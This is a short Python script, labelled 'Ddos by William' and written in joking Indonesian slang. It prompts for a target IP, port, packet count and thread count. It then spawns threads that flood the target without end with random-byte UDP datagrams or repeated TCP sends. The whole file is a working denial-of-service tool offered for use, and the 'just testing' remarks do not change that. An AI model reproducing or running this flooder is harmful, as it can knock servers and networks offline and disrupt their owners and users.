#!/usr/bin/env python3
#Kagak Usah Rename BY By Tai Anjing 
#Ddos by William
import random
import socket
import threading
import os

os.system("clear")
print("gabutan tes doang")
print("testing cooding")
ip = str(input(" taro ip dulu deh contoh: "))
port = int(input(" sama contoh juga: "))
choice = str(input(" jenis kelamin lu apa?ketikin(cewe/Cowo): "))
times = int(input(" masukin angka sebagai contoh: "))
threads = int(input(" masukin angka sebagai contoh: "))
print ("TAMBAHAN DOANG")
def run():
  data = random._urandom(1024)
  i = random.choice(("[anjay]","[wah]","[-_-]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +" | Proses!!!|")
    except:
      print("[wah] | Proses!!! |")

def run2():
  data = random._urandom(16)
  i = random.choice(("[anjay]","[wah]","[-_-]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +" Contoh doang!!!")
    except:
      s.close()
      print("[*] Down")

for y in range(threads):
  if choice == 'cewe':
    print("okeh ")
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()
for n in range(threads):
  if choice == 'cowo':
    print("cuih")
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()    